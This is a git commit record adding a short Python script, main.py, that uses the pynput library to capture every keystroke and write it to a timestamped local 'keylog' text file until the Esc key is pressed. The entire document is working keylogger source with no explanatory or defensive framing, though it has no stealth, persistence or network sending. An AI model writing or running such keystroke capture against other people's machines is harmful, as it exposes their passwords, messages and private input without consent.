5726e598c728f8cc0c9af832754dbce94b8b8b18
Leslie Asava <51715921+leslie-asava@users.noreply.github.com>
2019-11-25 14:40:41 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,22 @@
+from pynput.keyboard import Key, Listener
+import datetime
+
+filename = "keylog"+str(datetime.datetime.today())
+filename = filename.replace(" ","")
+filename = filename.replace(":","")
+filename = filename.replace(".","")
+filename+=".txt"
+file = open(filename,"w")
+
+def on_press(key):
+    file.write('{0}\n'.format(key))
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        file.close()
+        return False
+
+# Collect events until released
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
